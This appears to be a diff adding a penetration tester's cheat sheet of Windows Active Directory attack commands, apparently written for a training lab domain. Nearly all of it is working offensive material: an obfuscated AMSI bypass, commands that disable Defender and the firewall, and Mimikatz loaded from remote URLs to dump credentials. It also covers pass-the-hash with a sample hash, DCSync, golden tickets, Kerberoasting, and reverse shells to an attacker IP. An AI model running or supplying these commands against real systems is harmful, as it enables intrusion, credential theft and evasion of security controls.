@@ -1,0 +1,277 @@
+﻿Windows Active Directory Random Notes
+
+
+Choi “choi” Choi 
+최승관 
+
+
+Tools 
+Powerview - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
+
+
+Active Directory Powershell Module -  https://github.com/samratashok/ADModule
+
+
+Powerup - https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 
+
+
+Setup - Defender, AMSI, Exeuction Policy
+Ask for client permission for a set amount of time turning Defender off.
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true 
+	
+
+Have environment variable to bypass execution policy. Only persistent in one powershell session. 
+$env:PSExecutionPolicyPreference="bypass"
+	
+
+AMSI Bypass Payload → Google for recipe for root amsi bypass sET-ItEM 
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+	
+
+Injecting powershell scripts into current session 
+Inject Mimikatz on current powershell session 
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"
+	
+
+Inject Mimikatz for most up-to-date Windows (11/21/2019)
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://github.com/AddaxSoft/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1')"
+	
+
+
+
+Download Powerview - Touching disk!!! 
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1" -OutFile "C:\Windows\Temp\PowerView.ps1"
+
+$env:PSExecutionPolicyPreference="bypass"
+Import-Module C:\Windows\Temp\PowerView.ps1
+	Powershell 
+
+
+
+
+Invoke Mimikatz to dump the creds 
+Invoke-Mimikatz -DumpCreds 
+
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'
+	
+
+
+
+Lateral Movement - PSEXEC 
+msfconsole 
+use exploit/windows/smb/psexec
+set payload windows/meterpreter/reverse_tcp 
+
+options → load up smbuser, smbpass, smbdomain, share, rhosts 
+exploit -j 
+	
+
+
+
+Lateral Movement using a DA or something -  PSSession
+New-PSSession
+Enter-PSSession 
+Enter-PSSession -ComputerName <FQDN>
+
+# Stateful session 
+$sess = New-PSSession -ComputerName <FQDN>
+Enter-PSSession -Session $sess
+	
+
+
+
+Confirm admin access. If it’s true, that means our current domain USER has an Local Administrator Access to the server which the DA currently has a session in. 
+Invoke-UserHunter -CheckAccess
+Find-LocalAdminAccess -Verbose
+Invoke-EnumerateLocalAdmin -Verbose
+	
+
+
+
+
+
+
+
+Enumeration 
+Get-NetDomain
+Get-ADDomain 
+
+Get-NetDomainController
+Get-ADDomainController
+
+Get-NetUser
+Get-NetComputer
+	
+
+
+
+Importing Powershell Modules 
+$env:PSExecutionPolicyPreference=”bypas”
+Import-Module <modulePath>
+# List all commands in a module 
+Get-Command -Module <module_name>
+
+
+. ./<module>
+	
+
+
+
+[Ref].Assembly.GetType('http://System.Management .Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+	
+
+Pass The Hash 
+mimikatz.exe
+privilege::debug
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm_hash>
+Invoke-Mimikatz -Command ‘“Lsadump::lsa /patch”’ 
+Invoke-Mimikatz -Command ‘“lsadump::dcsync /user:<domain>\krbtgt
+Invoke-Mimikatz -Command ‘“kerberos::golden /User:Administrator /domain:<domain> /sid:<sid> /groups:<group> /startoffset:0 /endin:600 /renewmax:10080 /ptt”’ 
+<open up a new cmd/powershell> 
+	
+
+Over Pass the hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /User:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+	
+
+
+
+PSSession
+New-PSSession
+Enter-PSSession 
+Enter-PSSession -ComputerName <FQDN>
+
+# Stateful session 
+$sess = New-PSSession -ComputerName <FQDN>
+Enter-PSSession -Session $sess
+	
+
+
+
+# Create New Session 
+$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
+	
+
+# Bring Mimikatz to memory of the session 
+Invoke-Command -FilePath <path_to_mimikatz> -Session $sess 
+	
+
+# Inject local script (like mimikatz) into remote Session 
+Invoke-Coimmand -FilePath <local_ps1> -Session $sess
+	
+
+Reverse Shell Through RCE 
+powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PORT>
+
+powershell.exe iex (iwr http://172.16.100.43/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.43 -Port 443
+
+powershell iex (iwr http://172.16.100.43/Invoke-PowerShellTcp.ps1);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.43 -Port 443
+	
+
+Inject remote powershell module into the current powershell session 
+iex (iwr http://<ipaddr>/<file> -UseBasicParsing)
+powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<ip>/<file>')
+	
+
+
+
+Turn off Defender - Make sure to re-enable it after engagement 
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+Set-MpPreference -DisableIOAVProtection $true 
+Set-MpPreference -DisableRealtimeMonitoring $true
+	
+
+Turn off Firewall → Need Administrator privilege  
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+	
+
+
+
+Allow RDP 
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+	
+
+
+
+Copy File from attacker to Target machine - Disable Windows DEFENDER!
+Copy-Item <file_name> \\<FQDN>\C$\<file_path>
+	
+
+Download File inside powershell session 
+iwr -Uri 'http://<ip>/<file>' -Outfile <destination> 
+	
+
+Mimikatz
+# Dump Credentials 
+Invoke-Mimikatz -DumpCreds 
+
+# Dump credentials on multiple remote machines 
+Invoke-Mimikatz -DumpCreds -ComputerName @("<FQDN>", "<FQDN>")
+
+# "Pass the Hash"
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'
+	Domain Privilege Escalation 
+* Kerberoast
+* (Un)constrained Delegation 
+
+
+Kerberoast Procedure 
+1. Find User account used as Service Account 
+2. Request TGS from that “user account”
+3. Save the TGS to disk 
+4. Bruteforce the TGS 
+
+
+# 1. Find user account used as Service account 
+# Look for ServicePrincipalName that is NOT null 
+Get-NetUser -SPN 
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+	
+
+svcadmin = Domain Admin 
+
+
+# 2. Request TGS 
+Add-Type -AssemblyName System.IdentityModel 
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
+
+# PowerView 
+Request-SPNTicket 
+	
+
+# 3. Save TGS to disk 
+Invoke-Mimikatz -Command '"kerberos::list /export"'
+	
+
+# 4. Crack with john/hashcat/tgsrepcrack 
+Python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\<TGS_File>
+	
+
+________________
+
+
+RDP Trouble Shooting 
+
+
+Too destructive - ALWAYS ASK CLIENT PERMISSION
+
+
+Turn off Firewall → Need Administrator privilege  
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+	
+
+Turn off Defender 
+Set-MpPreference -DisableRealtimeMonitoring $true
+	
+
+Allow RDP 
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+	
+
+Add CredSSP to both the server and the client 
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters /v AllowEncryptionOracle /t REG_DWORD /d 2
+	
+
+Add corresponding users to Remote Desktop User group 
+net localgroup 'Remote Desktop Users' /add 'dcorp\Domain Admins'
